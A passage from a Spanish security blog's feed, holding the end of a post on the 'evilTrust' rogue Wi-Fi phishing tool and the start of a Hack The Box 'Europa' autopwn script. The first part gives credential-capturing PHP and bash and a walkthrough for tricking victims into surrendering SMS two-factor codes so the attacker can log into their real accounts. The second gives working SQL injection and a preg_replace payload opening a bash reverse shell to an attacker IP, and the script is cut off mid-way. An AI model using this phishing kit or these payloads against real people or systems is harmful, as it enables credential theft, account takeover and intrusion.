	&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${redColour}-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;privados&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;xargs&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${redColour}-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clear&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dado que es probable que la víctima cuente con el segundo factor de autenticación activado, disponer de sus credenciales a veces no es suficiente… ya que tras loguearnos tendremos que introducir el código que por SMS la plataforma le envía al dispositivo móvil asociado.&lt;/p&gt;

&lt;p&gt;No os preocupéis, está todo pensado. Cada plantilla del portal seleccionado cuenta con un fichero &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;post.php&lt;/code&gt;, donde tras reportar las credenciales a un fichero externo, se aplica un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Redirect&lt;/code&gt; hacia otra plantilla de la misma plataforma, donde se solicita el código recibido:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'datos-privados.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;print_r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;refresh&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0; url=http://192.168.1.1/portal_2fa/index.php&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para el que no haya entendido bien la jugada, la explico por aquí: La víctima introduce sus credenciales de acceso a la plataforma que hayas escogido para seguir navegando, tú como atacante recibes esas credenciales en texto claro desde consola, posteriormente la víctima es redirigida a otro portal en el que se le pide que introduzca el SMS recibido. El truco está en que la víctima no tiene salida a internet desde tu AP, por lo que nunca recibirá un código de esa sesión, ya que no se está logueando en la plantilla oficial. El chiste está en que tú por detrás, como ya posees sus credenciales, de manera inmediata las vas a estar validando en la plataforma real manualmente, entonces en caso de que posteriormente te pida el código del segundo factor de autenticación, como la víctima está ahora en esa plantilla esperando al código, le va a llegar un SMS pero de tú sesión, no de la suya, lo que le hará pensar que ya una vez introduciéndolo accederá a su cuenta.&lt;/p&gt;

&lt;p&gt;De esta forma, te proporcionará el código SMS de tu sesión, pudiendo así posteriormente acceder a su cuenta “burlando” esta medida de protección.&lt;/p&gt;

&lt;p&gt;La gran pregunta que algunos me hicisteis… ¿pero y si la víctima no tiene el segundo factor de autenticación habilitado?, pues bueno, en ese caso ya tienes sus credenciales. Es posible que la víctima sospeche y le resulte extraño que se le esté solicitando el código del SMS cuando ni si quiera tiene esa opción configurada, pero es la única forma que se me ocurrió de por lo menos cubrir ambas situaciones. También os digo… un público objetivo de calle no tiene muchas nociones de seguridad y la mayoría de las veces no lo entienden, dejándolo pasar sin sospechar de nada.&lt;/p&gt;

&lt;p&gt;En resumen, si la víctima tiene 2FA, podrás obtener el código, y si no lo tiene configurado… en el peor de los casos ya tienes sus credenciales, la víctima se quedará en la nueva plantilla esperando a que le llegue el código cuando nunca le va a llegar y tú mientras por detrás estarás accediendo a su cuenta.&lt;/p&gt;

&lt;p&gt;Como pequeña anotación, durante el evento, algunos compañeros hicieron uso de la herramienta y me comentaron que algunos introdujeron incluso hasta sus credenciales de empresa.&lt;/p&gt;

&lt;h2 id=&quot;demo-de-la-herramienta&quot;&gt;Demo de la herramienta&lt;/h2&gt;

&lt;p&gt;Configuramos las características de nuestro AP:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/evil-trust/step_one.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Definimos la plantilla a utilizar:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/evil-trust/step_two.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quedamos a la espera de que alguna víctima se conecte a nuestro AP para visualizar credenciales introducidas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_three.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;La víctima ve que hay una WiFi gratis disponible a su alcance y se conecta:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_four.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Tras la asociación al AP, se abre el navegador de manera automática solicitando las credenciales de acceso a la plataforma para continuar navegando:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_five.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;La víctima introduce sus credenciales para poder continuar navegando:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_six.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;El atacante visualiza las credenciales introducidas:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_seven.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;La víctima es redirigida al portal del segundo factor de autenticación de la plataforma:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_eight.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;El atacante valida las credenciales de la víctima desde otro navegador y como esta utiliza segundo factor de autenticación, se envía un SMS a la víctima, introduciendo posteriormente su código en la plantilla:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_nine.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;El atacante recibe desde consola el código y posteriormente accede a su cuenta:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/evil-trust/step_ten.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Jflabur</name><email>s4vipriv@gmail.com</email></author><category term="Scripting" /><category term="GitHub" /><category term="Bash" /><category term="Herramientas" /><summary type="html">Recientemente estuve en la h-c0n presentando la herramienta evilTrust. En este artículo, comento la utilidad de la herramienta para todos aquellos que la quieran probar. Gracias a los organizadores del evento por invitarme y a todos los presentes por la gran acogida.</summary></entry><entry><title type="html">Europa - Hack The Box</title><link href="http://localhost:4000/europa-hackthebox/" rel="alternate" type="text/html" title="Europa - Hack The Box" /><published>2020-01-31T00:00:00+01:00</published><updated>2020-01-31T00:00:00+01:00</updated><id>http://localhost:4000/europa-hackthebox</id><content type="html" xml:base="http://localhost:4000/europa-hackthebox/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/htb-writeup-europa/europa_logo.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autopwn&lt;/code&gt; que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.&lt;/p&gt;

&lt;p&gt;Para los interesados en la resolución de esta máquina, os dejo el enlace al vídeo que subí a mi canal:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=wOm4OOBLbys&quot;&gt;Máquina Europa - HackTheBox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;script-autopwn&quot;&gt;Script Autopwn&lt;/h2&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
#coding: utf-8
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Author: s4vitar https://www.youtube.com/watch?v=wOm4OOBLbys
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# Declaración de variables
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://admin-portal.europacorp.htb/login.php&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;url_openvpn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://admin-portal.europacorp.htb/tools.php&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;lport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIG_DFL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;obtainShell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;

 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keep_alive&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;'email'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin@europacorp.htb' OR '1' = '1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'admin'&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Realizando inyección SQL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Inyección SQL enviada'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Dashboard&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Inyección SQL realizada con éxito&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Acceso al Dashboard garantizado&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;failure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No ha sido posible realizar la inyección SQL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;progress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Explotación&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Creando un nuevo fichero de configuración VPN&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;openvpn_config_file_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;'pattern'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/ip_address/e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;'ipaddress'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;system(&quot;bash -c 'bash -i &amp;gt; /dev/tcp/10.10.14.55/443 0&amp;gt;&amp;amp;1'&quot;)&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
   &lt;span class=&quot;s&quot;&gt;'text'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ip_address = s4vitar'&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enviando petición al servidor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_openvpn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;openvpn_config_file_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

